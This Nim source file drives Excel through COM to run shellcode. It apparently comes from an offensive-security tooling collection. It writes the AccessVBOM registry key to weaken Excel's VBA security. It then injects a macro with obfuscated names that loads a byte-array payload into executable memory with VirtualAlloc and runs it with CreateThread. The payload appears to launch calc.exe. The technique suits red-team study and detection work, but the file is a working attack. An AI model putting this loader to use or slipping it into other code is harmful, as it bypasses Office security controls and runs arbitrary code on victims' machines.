#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
    This is some funky shit.
    Winim allows you to use COM objects like a script via the "comScript" macro.
    References:
        - https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba
]#

import strformat
import winim/com

comScript:
    var objExcel = CreateObject("Excel.Application")
    objExcel.Visible = false
    var WshShell = CreateObject("WScript.Shell")

    var Application_Version = objExcel.Version
    echo fmt"[+] Excel Version: {objExcel.Version} is detected on System"

    echo fmt"[+] Adjusting Excel Security Settings via Registry"
    var strRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
    WshShell.RegWrite(strRegPath, 1, "REG_DWORD")
    
    echo fmt"[+] Creating VBA object in Excel"
    var objWorkbook = objExcel.Workbooks.Add()
    var xlmodule = objWorkbook.VBProject.VBComponents.Add(1)

    echo fmt"[+] Planting Shellcode into Excel VBA Macro"
    var strCode = "#If Vba7 Then\n"
    strCode = strCode & "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n"
    strCode = strCode & "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n"
    strCode = strCode & "Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n"
    strCode = strCode & "#Else\n"
    strCode = strCode & "Private Declare Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n"
    strCode = strCode & "Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n"
    strCode = strCode & "Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n"
    strCode = strCode & "#EndIf\n"
    strCode = strCode & "\n"
    strCode = strCode & "Sub ExecShell()\n"
    strCode = strCode & "        Dim Wyzayxya As Long, Hyeyhafxp As Variant, Zolde As Long\n"
    strCode = strCode & "#If Vba7 Then\n"
    strCode = strCode & "        Dim  Xlbufvetp As LongPtr, Lezhtplzi As LongPtr\n"
    strCode = strCode & "#Else\n"
    strCode = strCode & "        Dim  Xlbufvetp As Long, Lezhtplzi As Long\n"
    strCode = strCode & "#EndIf\n"
    strCode = strCode & "        Hyeyhafxp = Array(252,72,131,228,240,232,192,0,0,0,65,81,65,80,82,81,86,72,49,210, _\n"
    strCode = strCode & "101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15, _\n"
    strCode = strCode & "183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201, _\n" 
    strCode = strCode & "13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,139, _\n" 
    strCode = strCode & "128,136,0,0,0,72,133,192,116,103,72,1,208,80,139,72,24,68,139,64, _\n" 
    strCode = strCode & "32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72, _\n" 
    strCode = strCode & "49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69, _\n" 
    strCode = strCode & "57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139, _\n" 
    strCode = strCode & "64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88, _\n" 
    strCode = strCode & "65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233, _\n" 
    strCode = strCode & "87,255,255,255,93,72,186,1,0,0,0,0,0,0,0,72,141,141,1,1,0,0,65,186, _\n"
    strCode = strCode & "49,139,111,135,255,213,187,224,29,42,10,65,186,166,149,189,157,255, _\n" 
    strCode = strCode & "213,72,131,196,40,60,6,124,10,128,251,224,117,5,187,71,19,114,111, _\n"
    strCode = strCode & "106,0,89,65,137,218,255,213,99,97,108,99,46,101,120,101,0)\n"
    strCode = strCode & "        Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)\n"
    strCode = strCode & "        For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n"
    strCode = strCode & "                Wyzayxya = Hyeyhafxp(Zolde)\n"
    strCode = strCode & "                Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n"
    strCode = strCode & "        Next Zolde\n"
    strCode = strCode & "        Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n"
    strCode = strCode & "End Sub\n"
    xlmodule.CodeModule.AddFromString(strCode)

    echo fmt"[+] Running Shellcode via Excel VBA Macro"
    objExcel.Run("ExecShell")
    objExcel.DisplayAlerts = false
    objWorkbook.Close(false)
